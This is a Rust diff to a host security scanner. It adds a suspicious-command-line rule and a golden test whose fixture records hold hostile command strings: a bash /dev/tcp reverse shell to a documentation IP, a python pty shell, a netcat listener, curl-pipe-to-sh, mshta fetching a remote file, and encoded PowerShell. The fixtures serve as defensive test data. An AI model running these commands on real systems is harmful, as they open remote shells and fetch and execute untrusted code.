+fn suspicious_cmdline(p: &mut ProcessRecord, v: &ProcessView, out: &mut FindingCollector) {
+    let Some((sev, indicator)) = check_suspicious_cmdline(&v.name_lower, &v.cmd_lower) else {
+        return;
+    };
+    raise_severity(p, sev);
+    let finding = OBFUSCATED_CMD
+        .finding(
+            sev,
+            format!("Suspicious Command-Line Payload in {} (PID {})", p.name, p.pid),
+            format!("Process '{}' launched with arguments matching: {}.", p.name, indicator),
+            format!("Cmdline: {}", p.cmdline),
+        )
+        .at_process(p);
+    out.insert(format!("H07-CMDLINE-{}", p.pid), finding);
 }
 
 impl ConnectionEntry {
@@ -946,5 +1039,102 @@ mod tests {
         let mut outbound = vec![socket("ESTABLISHED", 51234, Some(45560))];
         let findings = evaluate_security_heuristics(&mut outbound, &mut HashMap::new());
         assert!(findings.iter().any(|f| f.rule_id == "H05-OUTBOUND-C2-PORT"));
+    }
+
+    fn proc_rec(pid: u32, name: &str, exe: &str, cmd: &str, lineage: &[&str]) -> ProcessRecord {
+        ProcessRecord {
+            pid,
+            ppid: None,
+            name: name.to_string(),
+            exe_path: exe.to_string(),
+            cmdline: cmd.to_string(),
+            user: "u".to_string(),
+            sha256: None,
+            lineage: lineage.iter().map(|s| s.to_string()).collect(),
+            cpu_usage: 0.0,
+            memory_bytes: 0,
+            run_time_secs: 0,
+            exe_exists_on_disk: !exe.is_empty(),
+            is_deleted_binary: exe.ends_with(" (deleted)"),
+            open_sockets_count: 0,
+            max_severity: Severity::Safe,
+        }
+    }
+
+    /// One input that trips every rule. Guards refactors of this file.
+    fn golden_input() -> (Vec<ConnectionEntry>, HashMap<u32, ProcessRecord>) {
+        let wildcard = IpAddr::V4(Ipv4Addr::UNSPECIFIED);
+        let mut conns = Vec::new();
+        let mut add = |id: usize, name: &str, exe: &str, cmd: &str, state: &str, lp: u16, rp: Option<u16>| {
+            let mut c = socket(state, lp, rp);
+            c.id = id;
+            c.pid = Some(1000 + id as u32);
+            c.process_name = name.to_string();
+            c.exe_path = exe.to_string();
+            c.cmdline = cmd.to_string();
+            if state == "LISTEN" {
+                c.local_ip = wildcard;
+                c.exposure = ExposureScope::WildcardAllInterfaces;
+            }
+            conns.push(c);
+        };
+        add(1, "bash", "/usr/bin/bash", "bash -i", "ESTABLISHED", 51000, Some(4444));
+        add(2, "nc", "/usr/bin/nc", "nc -lvp 31337", "LISTEN", 31337, None);
+        add(3, "python3", "/usr/bin/python3", "python3 -c import socket,pty;pty.spawn('/bin/sh')", "ESTABLISHED", 51001, Some(443));
+        add(4, "redis-server", "/tmp/redis-server", "redis-server", "LISTEN", 6379, None);
+        add(5, "unknown", "", "", "ESTABLISHED", 51002, Some(443));
+        add(6, "app", "/opt/app", "app", "LISTEN", 8081, None);
+        add(7, "sshd", "/usr/sbin/sshd", "sshd", "LISTEN", 22, None);
+        add(8, "sshd", "/usr/sbin/sshd", "sshd", "ESTABLISHED", 22, Some(45560));
+        add(9, "miner", "/opt/miner", "miner", "ESTABLISHED", 51003, Some(3333));
+
+        let mut procs = HashMap::new();
+        for p in [
+            proc_rec(2001, "bash", "/usr/bin/bash", "bash -c sh -i >& /dev/tcp/198.51.100.7/4444 0>&1", &["nginx(400)", "bash(2001)"]),
+            proc_rec(2002, "x", "/dev/shm/x (deleted)", "x", &["x(2002)"]),
+            proc_rec(2003, "svchost.exe", r"C:\Users\u\AppData\Local\Temp\svchost.exe", "svchost.exe", &["svchost.exe(2003)"]),
+            proc_rec(2004, "x", "/tmp/x", "[kworker/0:0]", &["x(2004)"]),
+            proc_rec(2005, "powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "powershell.exe -nop -enc ZQBjAGgAbwA=", &[]),
+            proc_rec(2006, "sh", "/bin/sh", "sh -c curl http://x | sh", &[]),
+            proc_rec(2007, "mshta.exe", r"C:\Windows\System32\mshta.exe", "mshta.exe http://x/a.hta", &[]),
+            proc_rec(2008, "scvhost.exe", r"C:\Windows\scvhost.exe", "scvhost.exe", &[]),
+        ] {
+            procs.insert(p.pid, p);
+        }
+        (conns, procs)
+    }
+
+    fn golden_triples() -> Vec<String> {
+        let (mut conns, mut procs) = golden_input();
+        let findings = evaluate_security_heuristics(&mut conns, &mut procs);
+        let mut out: Vec<String> = findings
+            .iter()
+            .map(|f| format!("{} {:?} {:?}", f.rule_id, f.severity, f.pid))
+            .collect();
+        out.extend(conns.iter().map(|c| format!("conn{} {:?}", c.id, c.severity)));
+        out.sort();
+        out
+    }
+
+    #[test]
+    fn golden_input_trips_every_rule() {
+        let expected = include_str!("golden_heuristics.txt");
+        assert_eq!(golden_triples().join("\n"), expected.trim_end().replace("\r\n", "\n"));
+    }
+
+    /// Exact before/after dump for refactors:
+    /// cargo test print_golden_full -- --ignored --nocapture
+    #[test]
+    #[ignore]
+    fn print_golden_full() {
+        println!("TRIPLES\n{}\nFULL", golden_triples().join("\n"));
+        let (mut conns, mut procs) = golden_input();
+        let findings = evaluate_security_heuristics(&mut conns, &mut procs);
+        let mut lines: Vec<String> = findings.iter().map(|f| format!("{f:?}")).collect();
+        lines.extend(conns.iter().map(|c| format!("{:?} {:?} {:?}", c.id, c.severity, c.risk_reasons)));
+        let mut p: Vec<_> = procs.values().map(|p| format!("{} {:?}", p.pid, p.max_severity)).collect();
+        lines.append(&mut p);
+        lines.sort();
+        println!("{}", lines.join("\n"));
     }
 }
